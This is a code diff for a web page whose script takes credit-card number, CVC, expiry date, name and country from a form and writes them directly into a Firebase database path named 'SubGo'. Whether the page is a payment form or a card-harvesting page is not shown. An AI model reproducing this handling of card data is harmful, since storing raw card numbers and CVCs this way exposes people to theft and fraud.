@@ -75,9 +75,9 @@
     </div>
 
     <!-- Firebase scripts using the specified namespace -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-analytics-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+    <script defer src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
+    <script defer src="https://www.gstatic.com/firebasejs/9.6.0/firebase-analytics-compat.js"></script>
+    <script defer src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
     <!-- Your initialization script -->
     <script defer src="./init-firebase.js"></script>
     
@@ -104,18 +104,18 @@
           // Push data to the database
           const database = firebase.database();
 
-          const newDataRef = database.ref('SubGo');
-          newDataRef.push({
-            cardNumber: cardNumber,
-            cvc: cvc,
-            expireDate: expireDate,
-            name: name,
-            country: country
-          }).then(function () {
-            alert('Success!');
-          }).catch(function (error) {
-            alert('Error occurred.', error);
-          });
+    const newDataRef = database.ref('SubGo');
+    newDataRef.set({
+      cardNumber: cardNumber,
+      cvc: cvc,
+      expireDate: expireDate,
+      name: name,
+      country: country
+    }).then(function () {
+      alert('Success!');
+    }).catch(function (error) {
+      alert('Error occurred.', error);
+    });
         }
       }
 </script>
